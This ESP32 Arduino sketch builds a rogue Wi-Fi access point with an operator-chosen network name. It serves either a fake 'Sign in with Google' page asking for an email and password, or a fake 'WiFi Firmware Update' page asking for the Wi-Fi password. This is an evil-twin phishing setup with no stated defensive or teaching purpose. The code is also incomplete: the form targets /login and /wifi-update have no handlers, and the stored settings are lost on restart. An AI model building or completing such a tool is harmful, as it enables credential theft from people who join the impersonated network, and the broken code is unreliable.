#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>

const char* defaultSSID = "ESP32_Select_Option";
bool optionSelected = false;
String storedSSID = "";
String selectedOption = "";

AsyncWebServer server(80);

void restartWithNewSSID() {
    WiFi.softAPdisconnect(true);
    delay(1000);
    WiFi.softAP(storedSSID.c_str(), "password");
    delay(1000);
    ESP.restart();
}

void handleRoot(AsyncWebServerRequest *request) {
    if (optionSelected) {
        if (selectedOption == "1") {
            request->redirect("/option1");
        } else if (selectedOption == "2") {
            request->redirect("/option2");
        }
    } else {
        request->send(200, "text/html",
            "<html><body>"
            "<h2>Select an option:</h2>"
            "<form action='/setOption' method='POST'>"
            "SSID: <input type='text' name='ssid'><br>"
            "<input type='radio' name='option' value='1'> Option 1<br>"
            "<input type='radio' name='option' value='2'> Option 2<br>"
            "<input type='submit' value='Submit'>"
            "</form>"
            "</body></html>");
    }
}

void handleSetOption(AsyncWebServerRequest *request) {
    if (request->hasParam("ssid", true) && request->hasParam("option", true)) {
        storedSSID = request->getParam("ssid", true)->value();
        selectedOption = request->getParam("option", true)->value();
        optionSelected = true;
        request->send(200, "text/plain", "WiFi Restarting...");
        restartWithNewSSID();
    } else {
        request->send(400, "text/plain", "Missing parameters");
    }
}

void handleOption1(AsyncWebServerRequest *request) {
    request->send(200, "text/html",
        "<!DOCTYPE html><html><head><title>Google Login</title></head><body>"
        "<h2>Sign in with Google</h2>"
        "<form action='/login' method='POST'>"
        "Email: <input type='text' name='user'><br>"
        "Password: <input type='password' name='pass'><br>"
        "<input type='submit' value='Login'>"
        "</form></body></html>");
}

void handleOption2(AsyncWebServerRequest *request) {
    request->send(200, "text/html",
        "<!DOCTYPE html><html><head><title>WiFi Firmware Update</title></head><body>"
        "<h2>Verify WiFi Password</h2>"
        "<form action='/wifi-update' method='POST'>"
        "Enter WiFi Password: <input type='password' name='wifi_pass'><br>"
        "<input type='submit' value='Update'>"
        "</form></body></html>");
}

void setup() {
    Serial.begin(115200);
    WiFi.softAP(defaultSSID);
    server.on("/", HTTP_GET, handleRoot);
    server.on("/setOption", HTTP_POST, handleSetOption);
    server.on("/option1", HTTP_GET, handleOption1);
    server.on("/option2", HTTP_GET, handleOption2);
    server.begin();
}

void loop() {
}
